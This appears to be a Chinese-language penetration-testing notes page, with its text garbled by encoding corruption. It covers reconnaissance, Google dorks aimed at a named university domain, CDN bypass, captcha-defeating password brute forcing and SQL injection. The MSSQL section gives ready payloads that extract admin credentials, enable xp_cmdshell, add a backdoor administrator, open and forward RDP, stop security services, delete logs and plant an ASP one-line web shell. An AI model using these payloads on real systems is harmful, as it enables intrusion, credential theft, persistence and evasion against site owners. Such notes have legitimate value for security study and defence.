<p>whois æŸ¥è¯¢<strong>æ³¨å†Œäººä¿¡æ¯</strong>ï¼Œç«™é•¿å·¥å…·æˆ–çˆ±ç«™ç½‘ï¼Œå¾®æ­¥åœ¨çº¿ã€‚å¯ä»¥ç¤¾å·¥é‚®ç®±ï¼Œæ‰‹æœºå·ï¼Œé’“é±¼ï¼Œæ’åº“ç­‰ç­‰ã€‚é€šè¿‡é‚®ç®±æŸ¥è¯¢è¿˜æ³¨å†Œäº†å…¶ä»–å“ªäº›ç«™ç‚¹ï¼Œ</p>
</li>
</ul>
</li>
<li><p>æ•æ„Ÿç›®å½•</p>
<ul>
<li>robots.txtï¼šæ¯”è¾ƒæ•æ„Ÿï¼šç¼–è¾‘å™¨ã€ç®¡ç†åå°ç­‰</li>
<li>åå°ç›®å½•</li>
<li>å®‰è£…åŒ…ï¼šå¤‡ä»½ï¼Œé‡Œé¢æœ‰å¤‡ä»½çš„ç½‘ç«™ï¼Œåå°ï¼Œç›®å½•ç­‰</li>
<li>ä¸Šä¼ ç›®å½•ï¼šfckeditorï¼Œewebedit</li>
<li>mysqlç®¡ç†æ¥å£ï¼šæ¯”å¦‚phpmyadminï¼Œpmdï¼Œpma</li>
<li>å®‰è£…é¡µé¢ï¼šinstallï¼Œinstall.php.lockï¼Œå¯èƒ½ä¼šæš´éœ²cmsç‰ˆæœ¬ç­‰</li>
<li>phpinfoï¼šphpä¿¡æ¯ï¼ŒæŒ‡é’ˆï¼ŒåŠŸèƒ½ï¼Œæ ¹ç›®å½•</li>
<li>IIS çŸ­æ–‡ä»¶</li>
<li><strong>å·¥å…·</strong>ï¼šå¾¡å‰‘ã€çˆ¬è¡Œèœåˆ€</li>
</ul>
</li>
<li><p>ç«¯å£æ‰«æ</p>
<ul>
<li>110-pop3 8080-tomcat/jboss 9090-websphere 443-ssl 445-smb</li>
<li>å·¥å…·ï¼šnmapã€portscanã€ntscanã€telnet å¦‚æœä¸å…è®¸å·¥å…·è·‘ï¼Œå¯ä»¥ç”¨telnet</li>
<li>çœ‹æ˜¯å¦å­˜åœ¨å¼±å£ä»¤</li>
</ul>
</li>
<li><p>æ—ç«™Cæ®µ      æ—ç«™ï¼šåŒæœåŠ¡å™¨ä¸Šçš„å…¶ä»–ç«™ç‚¹     Cæ®µï¼šåŒä¸€ç½‘æ®µå…¶ä»–æœåŠ¡å™¨</p>
<ul>
<li><p>å·¥å…·ï¼šweb ã€‹k8æ—ç«™ã€å¾¡å‰‘1.5</p>
<p>â€‹            ç«¯å£ã€‹portscan</p>
</li>
</ul>
</li>
<li><p>æ•´ç«™åˆ†æ</p>
<ul>
<li><p>æœåŠ¡å™¨ç³»ç»Ÿ</p>
<p>Windows/linux</p>
<ul>
<li>é€šè¿‡åç¼€å¤§å°å†™æµ‹ç³»ç»Ÿï¼šLinuxåŒºåˆ†å¤§å°å†™</li>
</ul>
</li>
<li><p>è„šæœ¬æ ¼å¼</p>
<p>asp/aspx/<strong>php</strong>/jsp</p>
<ul>
<li>é€šè¿‡åç¼€åˆ¤æ–­è„šæœ¬æ ¼å¼</li>
</ul>
</li>
<li><p>æ•°æ®åº“ç±»å‹</p>
<p>access/mssql/mysql/oracle/db2/postgresql/sqlite</p>
</li>
<li><p>é˜²æŠ¤æƒ…å†µ</p>
<p>waf</p>
<ul>
<li>æ‰¾ä¸€ä¸ªidï¼ŒåŠ  and 1=1ï¼Œè¿”å›æ­£å¸¸ä¸€èˆ¬æœ‰waf</li>
</ul>
</li>
<li><p>CMSç±»å‹</p>
<p>dedecms/empirecms/meterinfo/dz</p>
<ul>
<li>è®¿é—®readme.txtï¼Œå¯èƒ½ä¼šæœ‰cmsä¿¡æ¯</li>
</ul>
</li>
<li><p>å®¹å™¨åˆ¤æ–­</p>
<p>æŠ“å“åº”åŒ…çœ‹serverä¿¡æ¯ï¼Œæˆ–è€…ä½¿å®ƒæŠ¥é”™</p>
</li>
</ul>
</li>
<li><p>è°·æ­Œhack</p>
<ul>
<li>intext:ç½‘é¡µä¸­å«æœ‰å…³é”®å­—çš„</li>
<li>intitle:æ ‡é¢˜</li>
<li>filetype:</li>
<li>inurl:asp?id=</li>
<li>site:æŒ‡å®šåŸŸå</li>
</ul>
</li>
<li><p>URLé‡‡é›†</p>
<ul>
<li>é‡‡é›†ç›¸å…³URLçš„åŒç±»ç½‘ç«™</li>
</ul>
</li>
<li><p>åå°æŸ¥æ‰¾</p>
<ul>
<li>å¼±å£ä»¤é»˜è®¤åå°<ul>
<li>admin/login.asp/manage</li>
</ul>
</li>
<li>é¡µé¢åº•éƒ¨å¯èƒ½ä¼šæœ‰ç®¡ç†é“¾æ¥</li>
<li>æœ‰äº›å›¾ç‰‡çš„å±æ€§å¯èƒ½ä¼šé“¾æ¥åˆ°åå°</li>
<li>åˆ©ç”¨cmsé»˜è®¤åå°</li>
<li>ç”¨å·¥å…·æŸ¥æ‰¾</li>
<li>robots.txt</li>
<li>google hack</li>
<li>yunsee.om</li>
<li>çŸ­æ–‡ä»¶åˆ©ç”¨<ul>
<li>a~!.asp å°±å¯ä»¥è®¿é—®åˆ°ä¾‹å¦‚ administrator123.asp</li>
<li>ä¸‹è½½ç½‘ç«™å¤‡ä»½æ•°æ®åº“æ—¶å¯ä»¥åˆ©ç”¨</li>
</ul>
</li>
<li>sqlmap â€“sql-shell load_file(â€˜d:/wwwroot/index.phpâ€™);</li>
</ul>
</li>
<li><p>ä¿¡æ¯åˆ†æ</p>
</li>
</ul>
<h2 id="CDN-ç»•è¿‡"><a href="#CDN-ç»•è¿‡" class="headerlink" title="CDN ç»•è¿‡"></a>CDN ç»•è¿‡</h2><h3 id="ä»€ä¹ˆæ˜¯-CDNï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-CDNï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ CDNï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ CDNï¼Ÿ</h3><p>å†…å®¹åˆ†å‘ç½‘ç»œï¼Œç”¨æ¥åŠ é€Ÿ</p>
<p>çˆ†ç ´éœ€è¦æ‰¾åˆ°çœŸå®æœåŠ¡å™¨ï¼Œæ³¨å…¥è‚¯å®šæ˜¯è·ŸçœŸå®æœåŠ¡å™¨åšäº¤äº’</p>
<h3 id="å¦‚ä½•æ¢æµ‹æ˜¯å¦æœ‰CDNï¼Ÿ"><a href="#å¦‚ä½•æ¢æµ‹æ˜¯å¦æœ‰CDNï¼Ÿ" class="headerlink" title="å¦‚ä½•æ¢æµ‹æ˜¯å¦æœ‰CDNï¼Ÿ"></a>å¦‚ä½•æ¢æµ‹æ˜¯å¦æœ‰CDNï¼Ÿ</h3><p>ç”¨ç«™é•¿å·¥å…·ï¼Œpingæµ‹è¯•ï¼Œå¦‚æœæœ‰å¤šä¸ªIPï¼Œè¯´æ˜æœ‰cdnã€‚</p>
<h3 id="å¦‚ä½•ç»•è¿‡ï¼Ÿ"><a href="#å¦‚ä½•ç»•è¿‡ï¼Ÿ" class="headerlink" title="å¦‚ä½•ç»•è¿‡ï¼Ÿ"></a>å¦‚ä½•ç»•è¿‡ï¼Ÿ</h3><ul>
<li>æŸ¥æ‰¾äºŒçº§åŸŸåï¼Œä¸€èˆ¬CDNåªä¼šæ¶åœ¨ä¸»åŸŸåä¸Šã€‚</li>
<li>è®©æœåŠ¡å™¨ä¸»åŠ¨ç»™ä½ å‘åŒ…ï¼Œæ¯”å¦‚é‚®ä»¶ï¼ŒæŸ¥çœ‹<strong>é‚®ä»¶åŸæ–‡</strong>ã€‚</li>
<li>æ•æ„Ÿæ–‡ä»¶æ³„éœ²ï¼Œæ¯”å¦‚phpinfoï¼Œinfophp</li>
<li>å†å²è§£æIPï¼Œip138ï¼ŒæŸ¥è¯¢å†å²IPã€‚</li>
<li>å¦‚æœæœ‰Appï¼ŒæŠ“åŒ…åˆ†æIPã€‚</li>
</ul>
<h3 id="è®¿é—®ç»•è¿‡CDN"><a href="#è®¿é—®ç»•è¿‡CDN" class="headerlink" title="è®¿é—®ç»•è¿‡CDN"></a>è®¿é—®ç»•è¿‡CDN</h3><p>ä¿®æ”¹hostsæ–‡ä»¶ï¼ŒæŠŠæ‰¾åˆ°çš„çœŸå®IPå’ŒåŸŸåç»‘å®šã€‚</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><p><strong>nmap</strong></p>
<ul>
<li><p>ä¸»æœºæ¢æµ‹</p>
<ul>
<li>nmap 192.168.0.1</li>
<li>nmap 192.168.0.1/24</li>
<li>nmap 192.168.0.1 192.168.0.101</li>
<li>nmap 192.168.0.1-100</li>
<li>nmap -iL scan.txt</li>
</ul>
</li>
<li><p>ç«¯å£æ‰«æ</p>
<ul>
<li>nmap -F -sT -v baidu.com F-100ä¸ªæœ€æœ‰å¯èƒ½å¼€æ”¾çš„ç«¯å£ï¼Œ sT é»˜è®¤tcpï¼Œvç°å®è¯¦ç»†ä¿¡æ¯</li>
<li>-sS SYNæ‰«æ</li>
</ul>
</li>
<li><p>-oN å¯¼å‡ºæ‰«æç»“æœ</p>
<p>-oX å¯¼å‡ºxmlæ ¼å¼</p>
</li>
<li><p>-f åˆ†ç‰‡ç»•è¿‡</p>
</li>
<li><p>â€“source-port åŸç«¯å£æ¬ºéª—</p>
</li>
</ul>
<h2 id="ç½‘ç«™çˆ†åº“æ¼æ´"><a href="#ç½‘ç«™çˆ†åº“æ¼æ´" class="headerlink" title="ç½‘ç«™çˆ†åº“æ¼æ´"></a>ç½‘ç«™çˆ†åº“æ¼æ´</h2><p>å¾—åˆ°æ•°æ®åº“åœ°å€ ğŸ‘‰ å°†æ•°æ®ä¸‹è½½åˆ°æœ¬åœ° ğŸ‘‰ æ‰¾åˆ°ç®¡ç†å‘˜å¯†ç  ğŸ‘‰ ç ´è§£ç™»å½•</p>
<p>çˆ†åº“ï¼Œä¸€èˆ¬æ˜¯ACCESSæ•°æ®åº“ï¼Œå› ä¸ºæ˜¯ä»¥æ–‡ä»¶å½¢å¼å­˜åœ¨çš„ã€‚æ¯”å¦‚data.mdb</p>
<p>å¦‚æœæ˜¯mssql/mysqlï¼Œä¸‹è½½æ•°æ®åº“è¿æ¥æ–‡ä»¶ï¼Œæ‰¾åˆ°åœ°å€ç™»å½•å¯†ç ç­‰ã€‚</p>
<ul>
<li>ç›®å½•éå†ï¼ˆè½¬åˆ°çˆ¶ç›®å½•ï¼‰</li>
<li>accessè®°å½•è¿æ¥ä¿¡æ¯çš„ï¼šè®¿é—®Inc%5cconn.aspï¼Œå¯èƒ½ä¼šå¯¼è‡´æºä»£ç æ³„éœ²ï¼Œæš´éœ²è·¯å¾„</li>
<li>intext:to parent directory+intext:mdb site:xiyou.edu.cn// æŒ‡å®šç«™ç‚¹ çœ‹æ˜¯å¦æœ‰ç›®å½•éå†</li>
<li>::$data æ³„éœ²ä»£ç ï¼Œæˆ–è€…å¯ä»¥ç›´æ¥ä¸‹è½½</li>
<li>å¦‚æœæœ‰ç‰¹æ®Šç¬¦å·ï¼Œå°±è¿›è¡Œurlç¼–ç ã€mantraportableã€‘</li>
</ul>
<h2 id="ä¸‹è½½æ¼æ´"><a href="#ä¸‹è½½æ¼æ´" class="headerlink" title="ä¸‹è½½æ¼æ´"></a>ä¸‹è½½æ¼æ´</h2><p>inurl:down.asp?FileName= site:xiyou.edu.cn</p>
<p>æŒ‡å®šç«™ç‚¹å°è¯•æ˜¯å¦å­˜åœ¨ä¸‹è½½æ¼æ´</p>
<h2 id="å¸¸è§cmsåå°"><a href="#å¸¸è§cmsåå°" class="headerlink" title="å¸¸è§cmsåå°"></a>å¸¸è§cmsåå°</h2><p>ç»‡æ¢¦ dede</p>
<p>discuz admin.php</p>
<p>å¸å›½ e/admin</p>
<p>phpweb admin.php</p>
<p>wordpress wp-admin</p>
<p>aspcms admin</p>
<p>ç§‘è®¯ã€å—æ–¹ã€è‰¯ç²¾ã€ecshop admin</p>
<p>å¸¸è§ï¼šmanage/login_admin/login_manage/houtai/denglu</p>
<p>æˆ–è€…çœ‹çœ‹ robots.txt ä½¿ç”¨è¯´æ˜.txt</p>
<p>æœç´¢ powered by aspcms 2.0</p>
<h2 id="å¯†ç çˆ†ç ´"><a href="#å¯†ç çˆ†ç ´" class="headerlink" title="å¯†ç çˆ†ç ´"></a>å¯†ç çˆ†ç ´</h2><p>å·¥å…·ï¼špkav httpfuzzer é’ˆå¯¹æœ‰éªŒè¯ç çš„å¯†ç çˆ†ç ´</p>
<ol>
<li>burpæŠ“åŒ…å¤åˆ¶åˆ°pkavï¼Œå¤åˆ¶è¯·æ±‚ç«™ç‚¹</li>
<li>æ·»åŠ æ ‡è®°ï¼Œä¿®æ”¹é‡æ”¾æ¨¡å¼</li>
<li>æ·»åŠ å­—å…¸</li>
<li>å›¾ç‰‡éªŒè¯ç è¯†åˆ«ï¼Œå±æ€§-åœ°å€ï¼Œæ”¾åˆ°åœ°å€ï¼Œè¯†åˆ«ï¼Œå¦‚æœæ˜¯çº¯æ•°å­—åˆ™å»æ‰å­—æ¯ï¼Œé•¿åº¦å›ºå®š</li>
<li>è°ƒçº¿ç¨‹ï¼Œä¼ªé€ x-forward-for</li>
<li>é‡è¯•è§„åˆ™ï¼Œå­—ç¬¦ä¸²åŒ¹é…ï¼šéªŒè¯ç é”™è¯¯</li>
<li>å‘åŒ…å™¨å‘åŒ…</li>
</ol>
<h2 id="ACCESS-æ³¨å…¥"><a href="#ACCESS-æ³¨å…¥" class="headerlink" title="ACCESS æ³¨å…¥"></a>ACCESS æ³¨å…¥</h2><p>æ‹¿åˆ°ä»£ç ä¸€èˆ¬å°±å¯ä»¥çœ‹åˆ°ç™»å½•çš„å¯†ç </p>
<p>æµ‹è¯•æ˜¯å¦æœ‰æ³¨å…¥ç‚¹ï¼Œå…¶å®å°±æ˜¯çœ‹æ˜¯å¦æœ‰æŠŠæäº¤çš„è¯­å¥å¸¦å…¥æ‰§è¡Œ</p>
<ul>
<li><p>/ï¼Œand1=1ï¼Œand 1=2ï¼Œ-0</p>
<p>ä½†ä¸æ˜¯å¸¦å…¥æ‰§è¡Œçš„è¯­å¥éƒ½æœ‰æ³¨å…¥</p>
</li>
<li><p><strong>åˆ¤æ–­æ•°æ®åº“æ³¨å…¥</strong></p>
<p>and exists (select * from msysobjects)&gt;0 <strong>Access</strong></p>
<p>and exists (select * from sysobjects)&gt;0 <strong>mssql</strong></p>
<ul>
<li><p>order by 3 æµ‹è¯•æœ‰å¤šå°‘åˆ—</p>
<ul>
<li><p>and exists (select * from admin) åˆ¤æ–­adminè¡¨æ˜¯å¦å­˜åœ¨ï¼Œè¿”å›æ­£å¸¸è¯´æ˜å­˜åœ¨</p>
</li>
<li><p>åˆ¤æ–­åˆ—æ˜¯å¦å­˜åœ¨ï¼šand exists (select pass from admin)ï¼Œè¿”å›æ­£å¸¸è¯´æ˜å­˜åœ¨</p>
</li>
<li><p>ç”¨unionè”åˆæŸ¥è¯¢çˆ†å‡º</p>
<p>union select 1,2,3 from admin</p>
<p>union select admin,2,pass from admin</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>å·¥å…·ï¼šç©¿å±±ç”²ï¼Œsqlmap</p>
</li>
</ul>
<h2 id="MSSQL-æ³¨å…¥"><a href="#MSSQL-æ³¨å…¥" class="headerlink" title="MSSQL æ³¨å…¥"></a>MSSQL æ³¨å…¥</h2><p>ASPï¼ŒASPXï¼Œä¸€èˆ¬æ˜¯oaç³»ç»Ÿï¼ˆåœ¨çº¿åŠå…¬ç³»ç»Ÿï¼‰ï¼Œå­¦æ ¡ã€æ£‹ç‰Œæ¸¸æˆã€æ”¿åºœã€äººäº‹è€ƒè¯•ç½‘ç«™ä¼šç¢°åˆ°ã€‚</p>
<p>0.0.0.0:<strong>1433</strong></p>
<p>ç®¡ç†å‘˜è´¦å·ï¼šsa æƒé™å¾ˆå¤§ï¼Œç³»ç»Ÿçº§ï¼Œä¸èƒ½ç»™saè®¾å¼±å£ä»¤</p>
<p>.mdf æ•°æ®åº“æ–‡ä»¶ / .ldf æ•°æ®åº“æ—¥å¿—æ–‡ä»¶</p>
<p><strong>dbID ç”¨æˆ·ä»5å¼€å§‹ï¼Œå‰4ä¸ªé¢„ç•™ç»™ç³»ç»Ÿ</strong></p>
<p>å¦‚æœæƒ³è¦åˆ é™¤æ•°æ®åº“ï¼š</p>
<ol>
<li>é¦–å…ˆåˆ†ç¦»ï¼šå³é”®-ä»»åŠ¡-åˆ†ç¦»-å‹¾é€‰åˆ é™¤é“¾æ¥-ç¡®å®š</li>
<li>è¿›å…¥æ•°æ®åº“è·¯å¾„ï¼Œç„¶ååˆ é™¤.mdfå’Œ.ldfæ–‡ä»¶</li>
</ol>
<p>å¦‚æœä½ çš„æ•°æ®åº“ç‰ˆæœ¬æ˜¯05ï¼Œç›®æ ‡æ˜¯08ï¼Œæ€ä¹ˆæ‹–è¿‡æ¥ï¼Ÿ</p>
<p>å³é”®-ç”Ÿæˆè„šæœ¬-é€‰æ‹©ä¸ºå“ªä¸ªæœåŠ¡å™¨ç‰ˆæœ¬ç¼–å†™çš„è„šæœ¬-è®°å¾—è¦å‹¾é€‰è¡Œä¸ºã€æºå¸¦æ•°æ®ã€‘-å‹¾é€‰è¡¨-ä¿å­˜</p>
<p><strong>å®‰å…¨å</strong> å¯ä»¥åˆ›å»ºæ–°ç™»å½•åï¼Œé€‰æ‹©ä¸ºå“ªä¸ªæ•°æ®åº“åˆ›å»ºçš„ï¼Œæ¶‰åŠåˆ°æƒé™é—®é¢˜ã€‚</p>
<p><strong>æœåŠ¡å™¨è§’è‰²ã€ç”¨æˆ·æ˜ å°„</strong> æ¶‰åŠåˆ°æƒé™</p>
<p>sa æƒé™æœ€å¤§ï¼šæ•°æ®åº“æ“ä½œã€æ–‡ä»¶ç®¡ç†ã€å‘½ä»¤æ‰§è¡Œã€æ³¨å†Œè¡¨è¯»å–ç­‰</p>
<p>db æ–‡ä»¶ç®¡ç†ã€æ•°æ®åº“æ“ä½œç­‰ <strong>å¯ä»¥é€šè¿‡æ•°æ®åº“å¤‡ä»½æ¥å†™shell</strong></p>
<p>public æ•°æ®åº“æ“ä½œ æœ€å¤šå¯ä»¥è¯»å–ç®¡ç†å‘˜è´¦æˆ·å’Œå¯†ç ç™»åå°ï¼Œæ— æ³•å†™shell</p>
<p>å¸¸è§è¿æ¥é…ç½®æ–‡ä»¶åï¼š</p>
<p>asp: conn.asp,dbconfig.asp</p>
<p>aspx: web.config</p>
<h3 id="æ³¨å…¥"><a href="#æ³¨å…¥" class="headerlink" title="æ³¨å…¥"></a>æ³¨å…¥</h3><ol>
<li><p>åˆ¤æ–­æ˜¯å¦æœ‰æ³¨å…¥</p>
<p>and 1=1,and 1=2,/,-0</p>
</li>
<li><p>åˆ¤æ–­æ˜¯å¦æ˜¯ mssql</p>
<p><strong>ACCESS</strong> and (select count(*) from msysobjects)&gt;0 è¿”å›æ­£å¸¸è¯´æ˜æ˜¯ACCESSæ•°æ®åº“</p>
<p><strong>MSSQL</strong> and (select (count(*) from sysobjects)&gt;0 è¿”å›æ­£å¸¸è¯´æ˜æ˜¯mssqlæ•°æ®åº“</p>
</li>
<li><p>æµ‹è¯•æƒé™ï¼ˆmssql å¯¹åº”æœåŠ¡å™¨è§’è‰²ï¼‰</p>
<p>and 1=(select IS_SRVROLEMEMBER(â€˜sysadminâ€™));â€“</p>
<p>å¯æµ‹è¯• serveradmin/setupadmin/securityadmin/diskadmin/bulkadmin</p>
<p>and 1=(select IS_MEMBER(â€˜db_ownerâ€™));â€“</p>
</li>
<li><p>æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬</p>
<p>id = 1 and 1= (select @@version) æµ‹è¯•å½“å‰æ•°æ®åº“ç‰ˆæœ¬ï¼Œç„¶åå¯ä»¥æœç´¢ä½ç‰ˆæœ¬æ¼æ´</p>
<p>åŸç†ï¼šid=1æ˜¯æŸ¥è¯¢integerç±»å‹çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®åº“ç‰ˆæœ¬ä¿¡æ¯æ˜¯charç±»å‹æ•°æ®ï¼Œä¼šå¼ºåˆ¶è½¬æ¢ï¼Œå¤±è´¥çš„è¯å°±ä¼šæŠ¥é”™ï¼Œåœ¨é”™è¯¯ä¿¡æ¯ä¸­æš´éœ²ç‰ˆæœ¬ä¿¡æ¯ï¼Œå…¶ä»–åŒç†ï¼Œå¯ä»¥ç›´æ¥åœ¨idå¤„æŸ¥è¯¢ï¼šid=db_name()</p>
</li>
<li><p>db_name() æŸ¥è¯¢æ•°æ®åº“åç§°</p>
</li>
<li><p>æŸ¥è¯¢ç”¨æˆ·åˆ›å»ºçš„ç¬¬ä¸€ä¸ªæ•°æ®åº“</p>
<p>and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)</p>
<p>ç¬¬äºŒä¸ª</p>
<p>and 1=(select top 1 name from master..sysdatabases where dbid&gt;4 and name &lt;&gt; â€˜xxxâ€™)</p>
<p>æˆ–</p>
<p>and 1=(select top 1 name from master..sysdatabases where dbid&gt;5)</p>
</li>
<li><p>æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“</p>
<p>and 1=(slect name from master..sysdatabases for xml path)</p>
</li>
<li><p>åˆ—è¡¨å</p>
<p>and 1=(select top 1 name from sysobjects where xtype=â€™uâ€™)</p>
<p>ç¬¬äºŒä¸ª</p>
<p>and 1=(select top 1 name from sysobjects where xtype=â€™uâ€™ and name &lt;&gt; â€˜adminâ€™) è¿™æ¡è¯­å¥ä¸€èˆ¬ä¸æ‹¦</p>
</li>
<li><p>åˆ—æ‰€æœ‰è¡¨</p>
<p>and 1=(select name from sysobjects for xml path)</p>
</li>
<li><p>è·å–åˆ—å</p>
<p>and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name =â€™usersâ€™))</p>
<p>ç¬¬äºŒåˆ—</p>
<p>and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name =â€™usersâ€™) and name &lt;&gt; â€˜nameâ€™)</p>
</li>
<li><p>è·å–æ•°æ®</p>
<p>and 1=(select top 1 <strong>admin</strong> from <strong>admin</strong>)</p>
<p>and 1=(select top 1 <strong>pass</strong> from <strong>admin</strong>)</p>
</li>
</ol>
<p>å¦‚æœæœ‰æ‹¦æˆªï¼Œå¯ä»¥æ”¹å˜å¤§å°å†™æ¥ç»•è¿‡</p>
<h4 id="åˆ©ç”¨-MSSQL-æ‰©å±•å­˜å‚¨æ³¨å…¥æ”»å‡»"><a href="#åˆ©ç”¨-MSSQL-æ‰©å±•å­˜å‚¨æ³¨å…¥æ”»å‡»" class="headerlink" title="åˆ©ç”¨ MSSQL æ‰©å±•å­˜å‚¨æ³¨å…¥æ”»å‡»"></a>åˆ©ç”¨ MSSQL æ‰©å±•å­˜å‚¨æ³¨å…¥æ”»å‡»</h4><p>å¦‚æœæ˜¯saæƒé™ï¼Œèƒ½åšçš„äº‹å¾ˆå¤šï¼Œæ¯”å¦‚æ‰§è¡Œå‘½ä»¤ã€‚å‡å¦‚æ³¨å…¥æˆåŠŸï¼Œä½†æ˜¯ç ´è§£ä¸äº†åå°ç®¡ç†å‘˜å¯†ç ï¼Œå°±å¯ä»¥ç”¨å‘½ä»¤ä¿®æ”¹å¯†ç ã€‚</p>
<p>è¿™é‡Œå°±è¦ç”¨åˆ°æ‰©å±•æ’ä»¶</p>
<ol>
<li><p><strong>æ£€æµ‹ä¸æ¢å¤æ‰©å±•æ’ä»¶</strong></p>
<p><strong>åˆ¤æ–­ xp_cmdshell æ˜¯å¦å­˜åœ¨ï¼š</strong></p>
<p>and 1=(select count(*) from master.dbo.sysobjects where xtype=â€™xâ€™AND name=â€™xp_cmdshellâ€™)</p>
<p><strong>åˆ¤æ–­ xp_regread æ˜¯å¦å­˜åœ¨ï¼š</strong></p>
<p>and 1=(select count(*) from master.dbo.sysobjects where name=â€™xp_regreadâ€™)</p>
<p><strong>æ¢å¤æ’ä»¶ï¼š</strong></p>
<p>EXEC sp_configure â€˜show advanced optionsâ€™, 1;RECONFIGURE;EXEC sp_configure â€˜xp_cmdshellâ€™, 1;RECONFIGURE; <strong>æ¢å¤cmdshell</strong></p>
<p>exec sp_dropextendedproc xp_cmdshell,â€™xplog70.dllâ€™</p>
<p><strong>å…³é—­æ’ä»¶ï¼š</strong></p>
<p>exec sp_configure â€˜show advanced optionsâ€™, 1;reconfigure;<br>exec sp_configure â€˜xp_cmdshellâ€™, 0;reconfigure;</p>
</li>
<li><p><strong>æ‰§è¡Œå‘½ä»¤ï¼š</strong></p>
<p>æ–°å»ºç”¨æˆ·å¹¶ç§»åˆ°ç®¡ç†å‘˜ç»„ï¼š</p>
<p>;exec master..xp_cmdshell â€˜net user test test /addâ€™</p>
<p>;exec master..xp_cmdshell â€˜net localgroup administrators test /addâ€™</p>
<p>ç„¶åå°±å¯ä»¥è¿œç¨‹è¿æ¥ï¼Œå¦‚æœç«¯å£æœªå¼€æ”¾å¯ä»¥å°è¯•æ‰“å¼€ç«¯å£</p>
<p><strong>å¼€å¯3389</strong></p>
<p>;exec master..xp_cmdshell â€˜sc config termservice start=autoâ€™</p>
<p>;exec master..xp_cmdshell â€˜net start termserviceâ€™</p>
<p>;exec master..xp_cmdshell â€˜reg add â€œHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Serverâ€ /vfDenyTSConnections /t REG_DWORD /d 0x0 /fâ€™</p>
</li>
<li><p><strong>æ·»åŠ æˆ–åˆ é™¤ä¸€ä¸ªsaæƒé™çš„ç”¨æˆ·test</strong></p>
<p>;exec master.dbo.sp_addlogin test,password</p>
<p>;exec master.dbo.sp_addsrvrolemember test,sysadmin</p>
</li>
<li><p><strong>å¯åŠ¨æˆ–åœæ­¢æœåŠ¡ï¼Œæ¯”å¦‚å®‰å…¨ç‹—</strong></p>
<p>;exec master..xp_servicecontrol â€˜stopâ€™,â€™scheduleâ€™</p>
<p>;exec master..xp_servicecontrol â€˜startâ€™,â€™scheduleâ€™</p>
</li>
<li><p><strong>åˆ é™¤æ—¥å¿—è®°å½•</strong></p>
<p>;exec master.dbo.xp_cmdshell â€˜del c:\winnt\system32\logfiles\xxx\xxx.logâ€™</p>
</li>
<li><p><strong>å¼€å¯è¿œç¨‹æ•°æ®åº“</strong></p>
<p>;select * from openrowset(â€˜sqloledbâ€™,â€™server=servername;uid=sa;pws=abcâ€™,â€™select * from table 1â€™)</p>
</li>
<li><p><strong>æŠŠ3389è½¬å‘åˆ°80ç«¯å£</strong></p>
<p>å› ä¸ºè·¯ç”±å™¨çš„3389ä¸å¯èƒ½åšè½¬å‘ï¼Œæ‰€ä»¥æŠŠç›®æ ‡æœåŠ¡å™¨çš„3389è½¬å‘åˆ°è·¯ç”±å™¨çš„80ä¸Šï¼Œæ¥è¿›è¡Œè¿æ¥ï¼š</p>
<p>;exec master..xpcmdshell â€˜reg add â€œHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcpâ€ /v PortNumber /t REG_DWORD /d 0x50 /fâ€™</p>
</li>
</ol>
<h4 id="åˆ©ç”¨-sp-makewebtask-å†™ä¸€å¥è¯æœ¨é©¬"><a href="#åˆ©ç”¨-sp-makewebtask-å†™ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="åˆ©ç”¨ sp_makewebtask å†™ä¸€å¥è¯æœ¨é©¬"></a>åˆ©ç”¨ sp_makewebtask å†™ä¸€å¥è¯æœ¨é©¬</h4><p>;exec sp_makewebtask â€˜c:\inetpub\wwwroot\xxx\a.aspâ€™,â€™select â€˜â€™&lt;%execute (request(â€œcmdâ€))%&gt;â€™â€™â€™</p>
<p>å¦‚æœå†™ä¸è¿›å»ï¼Œå…ˆæ‰§è¡Œï¼š</p>
<p>;exec sp_configure â€˜Web Assistant Proceduresâ€™, 1;RECONFIGURE</p>
<h4 id="å¦‚æœæ˜¯-dbowner-æƒé™å†™ä¸€å¥è¯"><a href="#å¦‚æœæ˜¯-dbowner-æƒé™å†™ä¸€å¥è¯" class="headerlink" title="å¦‚æœæ˜¯ dbowner æƒé™å†™ä¸€å¥è¯"></a>å¦‚æœæ˜¯ dbowner æƒé™å†™ä¸€å¥è¯</h4><p>;alter database ssdown5 set recovery full    æŠŠç½‘ç«™æ”¹æˆrecoveryæ¨¡å¼</p>
<p>;create table test(str image)â€“    åˆ›å»ºä¸€ä¸ªè¡¨</p>
<p>;backup log ssdown5 to disk=â€™c:\testâ€™ with initâ€“    å¤‡ä»½ä¸€ä¸‹</p>
<p>;insert into test(str) values (â€˜&lt;%execute (request(â€œcmdâ€))%&gt;â€™)â€“    æ’å…¥ä¸€å¥è¯</p>
<p>;backup log ssdown5 to disk=â€™c:\inetpub\wwwroot\x.aspâ€™â€“    å¤‡ä»½åˆ°ç½‘ç«™æ ¹ç›®å½•</p>
<p>;alter database ssdown5 set recovery simple    è½¬æ¢æ¨¡å¼</p>
<p>å·¥å…·ï¼šgetwebshell å¢å¼ºç‰ˆ éœ€è¦ç½‘ç«™æ ¹ç›®å½•/ç©¿å±±ç”²/sqlmap/èåœå¤´</p>
<p>ä¸€èˆ¬å¯ä»¥åˆ—å‡ºå…¶ä»–åº“åçš„æ—¶å€™è¯´æ˜å¯ä»¥è·¨åº“æŸ¥è¯¢</p>
